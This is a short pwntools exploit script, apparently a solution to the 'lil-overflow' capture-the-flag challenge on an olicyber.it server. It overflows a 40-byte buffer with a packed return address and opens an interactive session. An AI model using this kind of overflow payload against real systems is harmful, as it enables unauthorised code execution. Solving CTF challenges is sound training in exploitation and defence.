from pwn import *

exe = ELF("./lilof_patched")

context.binary = exe

HOST = "lil-overflow.challs.olicyber.it"
PORT = 34002

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r = conn()

    r.send(b"A" * 40 + pack(0x5ab1bb0))

    r.interactive()

if __name__ == "__main__":
    main()
